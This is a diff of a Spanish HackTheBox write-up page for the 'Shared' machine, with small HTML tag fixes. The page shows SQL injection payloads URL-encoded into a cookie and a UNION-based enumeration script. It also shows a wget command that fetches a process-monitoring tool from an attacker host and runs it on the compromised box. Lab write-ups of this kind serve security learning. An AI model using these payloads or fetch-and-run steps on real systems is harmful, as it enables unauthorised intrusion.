@@ -44,7 +44,7 @@ Type ".help" for more information.
 &gt; decodeURIComponent('%7B%22YCS98E4A%22%3A%221%22%7D')  
 <span class="code-dark-green">'{"YCS98E4A":"1"}'</span>
 </code></pre></div><h3 id="encontrando-un-sqli">Encontrando un SQLi</h3><p>Vale, se trata de un documento JSON. ¿Qué pasa si modificamos la <em>cookie</em> y usamos un <em>payload</em> de inyección de código SQL? Vamos a probar:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; encodeURIComponent(`{"' or 1=1-- -":"1"}`)  
-<span class="code-dark-green">"%7B%22'%20or%201%3D1--%20-%22%3A%221%22%7D"
+<span class="code-dark-green">"%7B%22'%20or%201%3D1--%20-%22%3A%221%22%7D"</span>
 </code></pre></div><p>Ahora podemos poner la <em>cookie</em> en el navegador y ver lo que tenemos:</p><p><img alt="Shared item sqli" src="/images/HTB/Shared/Shared-checkout-sqli.webp"></p><p>Si miramos bien, veremos que el producto del carrito es diferente del que teníamos antes, por lo que la inyección ha tenido efecto. Ahora podemos usar consultas <code>UNION</code> para ver el número de columnas de la tabla actual y descubrir la columna que se refleja en la página.</p><p>Finalmente, veremos que tenemos 3 columnas y que la segunda es la que se refleja:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; encodeURIComponent(`{"' union select 1,2,3-- -":"1"}`)
 <span class="code-dark-green">"%7B%22'%20union%20select%201%2C2%2C3--%20-%22%3A%221%22%7D"</span>  
 </code></pre></div><p><img alt="Shared item sqli union" src="/images/HTB/Shared/Shared-checkout-sqli-union.webp"></p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Para enumerar la base de datos, decidí escribir un <em>script</em> sencillo en Node.js llamado <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Shared/sqli.js"><code>sqli.js</code></a> (explicación detallada <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Shared#sqlijs">aquí</a>). Tendremos esta salida en la columna reflejada:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">sqli.js</span> <span class="code-dark-yellow">"' union select 1,'asdf',3-- -"</span>  
@@ -110,12 +110,12 @@ uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(develo
 <span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ ls -la /opt/scripts_review/
 total 8
 drwxrwx--- 2 root developer 4096 Jul 14 13:46 <span class="code-blue">.</span>
-drwxr-xr-x 3 root root      4096 Jul 14 13:46 <span class="code-blue">..
+drwxr-xr-x 3 root root      4096 Jul 14 13:46 <span class="code-blue">..</span>
 </code></pre></div><h2 id="movimiento-lateral-al-usuario-dan_smith">Movimiento lateral al usuario <code>dan_smith</code></h2><p>Si subimos <a target="_blank" href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a> a la máquina y lo ejecutamos, veremos algunos comandos sospechosos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ wget -qO .pspy 10.10.17.44/pspy64s
 <span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ chmod +x .pspy
 <span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ ./.pspy
 ...
-</span><span class="code-blue">CMD: UID=0    PID=2624   | /usr/sbin/CRON -f</span>
+<span class="code-blue">CMD: UID=0    PID=2624   | /usr/sbin/CRON -f</span>
 <span class="code-blue">CMD: UID=1001 PID=2629   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython</span>  
 <span class="code-blue">CMD: UID=0    PID=2628   | /bin/bash /root/c.sh</span>
 <span class="code-blue">CMD: UID=0    PID=2627   | /bin/bash /root/c.sh</span>
